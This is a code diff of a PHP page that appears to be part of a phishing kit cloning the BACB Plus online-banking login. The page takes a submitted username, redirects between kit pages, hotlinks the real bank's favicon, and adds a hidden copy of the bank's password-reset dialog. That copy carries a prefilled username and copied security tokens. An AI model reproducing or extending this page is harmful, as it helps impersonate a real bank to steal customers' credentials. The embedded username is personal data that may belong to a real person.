@@ -1,17 +1,11 @@
 <?php
-//-=-=-=-=-=--=-=-=-=--=-==--==-=-=Comming validation=-=-=-=-=-=-=-=---==-=-=-\\
-if (isset($_POST['submith']) && !empty($_POST['userName'])){
+// -=-=-=-=-=--=-=-=-=--=-==--==-=-=Comming validation=-=-=-=-=-=-=-=---==-=-=-\\
+if (isset ( $_POST ['submith'] ) && ! empty ( $_POST ['userName'] )) {
 	
-	$userName = $_POST['userName'];
-	
-}else {
-	header('Location: ./BurkanPlus.php');
+	$userName = $_POST ['userName'];
+} else {
+	header ( 'Location: ./BurkanPlus.php' );
 }
-
-
-
-
-
 
 ?>
 
@@ -30,9 +24,11 @@ if (isset($_POST['submith']) && !empty($_POST['userName'])){
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="stylesheet" type="text/css" href="./assets/css/flaticon.css">
 <link type="text/css" rel="stylesheet" href="./assets/css/login.css">
-<link type="image/x-icon" href="https://transact.bacbplus.bg/images/fav2icon.ico" rel="Icon">
+<link type="image/x-icon"
+	href="https://transact.bacbplus.bg/images/fav2icon.ico" rel="Icon">
 </head>
 <body>
+
 	<form id="m_Form" method="post" style="margin: 0px" action="">
 		<input type="hidden" name="userTime" id="userTime">
 		<section>
@@ -80,7 +76,7 @@ if (isset($_POST['submith']) && !empty($_POST['userName'])){
 								<!--CAPTCHA-->
 								<!--CAPTCHA-->
 								<div class="login-links">
-									<a class="show-dialog" id="passwordDialog" href=""> Забравена
+									<a class="show-dialog" id="passwordDialog" href="#"> Забравена
 										парола ? </a>
 								</div>
 							</div>
@@ -136,6 +132,122 @@ if (isset($_POST['submith']) && !empty($_POST['userName'])){
 			</div>
 		</footer>
 	</form>
-	
+	<div id="forgoten" style="visibility: hidden;">
+		<div
+			class="ui-dialog ui-widget ui-widget-content ui-corner-all dialogfooter"
+			tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-1"
+			style="display: block; z-index: 1002; outline: 0px; height: auto; width: 650px; top: 222px; left: 375.5px;">
+			<div
+				class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix">
+				<span class="ui-dialog-title" id="ui-dialog-title-1">Забравена
+					парола</span><a href="#"
+					class="ui-dialog-titlebar-close ui-corner-all" role="button"><span
+					class="ui-icon ui-icon-closethick">close</span></a>
+			</div>
+			<div class="ui-dialog-content ui-widget-content"
+				style="width: auto; min-height: 0px; height: 196px;" scrolltop="0"
+				scrollleft="0">
+
+
+				<form
+					action="/individual/mvc/ForgotPassword/Index?xml_id=%2Fbg-BG%2F&amp;ajaxRequest=true"
+					method="post">
+					<div id="forgotPassword" class="pmt_doc_wrap">
+						<p class="note" style="padding: 1em; text-align: justify;">В
+							случай на забравена парола, тя може да бъде сменена онлайн чрез
+							подаване на долната заявка и подписването й с КЕП, Е-ТАН или
+							парола от дисплей карта. В случай, че нямате регистрирано активно
+							средство за сигурност, за да смените Вашата парола е необходимо
+							да посетите лично офис на банката.</p>
+
+						<div class="validation-summary-valid"
+							data-valmsg-summary-server-side="true">
+							<ul>
+								<li style="display: none"></li>
+							</ul>
+						</div>
+						<fieldset class="col2">
+
+							<div class="column">
+
+								<label for="Name"> Потребител <span>*</span>
+
+
+
+
+								</label> <input class="input-validation-margin valid"
+									data-val="true" data-val-required="Полето е задължително."
+									id="Name" name="Name" templateid="PaymentInputWithHelp"
+									type="text" value="JasenAngelov111">
+
+								<div>
+									<span class="field-validation-valid" data-valmsg-for="Name"
+										data-valmsg-replace="true"></span>
+
+								</div>
+
+
+							</div>
+
+							<div class="column">
+								<label for="SecurityDevice" style="white-space: nowrap">
+									Средство за сигурност * </label> <select id="SecurityDevice"
+									name="SecurityDevice">
+
+									<option selected="selected" value="5">Парола от Е-ТАН</option>
+									<option value="1">парола от диспплей карта</option>
+
+									<option value="3">КЕП - Квалифициран Електронен Подпис</option>
+
+								</select>
+							</div>
+						</fieldset>
+						<fieldset class="col2" id="captchaHoldercall">
+							<div class="column">
+								<label for="Captcha_Code" style="white-space: nowrap"> Число за
+									контрол * </label>
+							</div>
+
+							<div class="column">
+								<input class="input-validation-margin" id="Captcha_Code"
+									name="Captcha.Code" type="text" value=""> <label class="note">Въведете
+									6-цифреното число, което виждате на своя екран.</label>
+
+								<div>
+									<span class="field-validation-valid"> </span>
+								</div>
+
+
+							</div>
+							<input id="Captcha_EncodedCode" name="Captcha.EncodedCode"
+								type="hidden"
+								value="">
+							<div class="column">
+								<img id="Captcha_Image" src="./" alt="">
+
+							</div>
+						</fieldset>
+						<br style="clear: both;">
+
+						<div class="btnfoot clearfix">
+
+							<a id="cancel" class="cancel" tabindex="2"><span>Откажи</span></a>
+
+							<a id="changePassword" title="потвърди" class="save" tabindex="1"><span>потвърди</span></a>
+						</div>
+
+						<div style="clear: both; line-height: 0px;">&nbsp;</div>
+
+					</div>
+
+					<input type="hidden" name="as_sfid"
+						value="AAAAAAUCeI6_OXUS2uoQwcGhDS2-_X_wpN5itz0-oKR8xkjKU9N8ADFo1pcjA5mIiELQe7TVZ3XG62S5sWAyjaCJazDezisPwM2KVO1xEyD-3YJSbchzUagGlAbQExZ0PLw47hw="><input
+						type="hidden" name="as_fid"
+						value="79924397c8966aaf493fc3686e960fa28bf59a17">
+				</form>
+			</div>
+		</div>
+	</div>
+	<script type="text/javascript" src="./assets/js/functions.js"></script>
 </body>
 </html>
